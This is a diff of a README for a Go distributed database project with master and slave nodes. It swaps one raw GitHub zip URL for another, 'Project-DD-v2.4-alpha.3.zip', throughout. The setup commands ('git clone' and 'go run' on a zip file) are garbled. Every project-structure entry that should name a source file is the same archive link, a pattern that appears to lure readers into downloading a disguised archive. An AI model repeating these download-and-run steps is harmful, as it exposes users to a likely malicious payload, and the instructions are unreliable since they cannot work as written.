@@ -48,7 +48,7 @@ Design and implement a basic distributed database system using the Go programmin
 1. Clone the repository:
 
    
-   git clone https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
+   git clone https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip
    cd distributed-mysql
    
 
@@ -59,13 +59,13 @@ Design and implement a basic distributed database system using the Go programmin
 4. Run the Master Node:
 
    
-   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
+   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip
    
 
 5. Run the Slave Node:
 
    
-   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
+   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip
    
 
 ## 🚀 Usage
@@ -94,21 +94,21 @@ Design and implement a basic distributed database system using the Go programmin
 
 ## 📂 Project Structure
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the master node.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Main file for the master node.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the slave nodes.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Main file for the slave nodes.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Database management, handling SQL connections and query execution.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Database management, handling SQL connections and query execution.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Handles TCP communication to send messages.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Handles TCP communication to send messages.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Handles TCP communication to receive messages.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Handles TCP communication to receive messages.
 
 * pkg/network: TCP communication package.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the master node.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Main file for the master node.
 
-* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the slave nodes.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/slave/Project-DD-v2.4-alpha.3.zip Main file for the slave nodes.
 
 * pkg/db: Database management package.
 
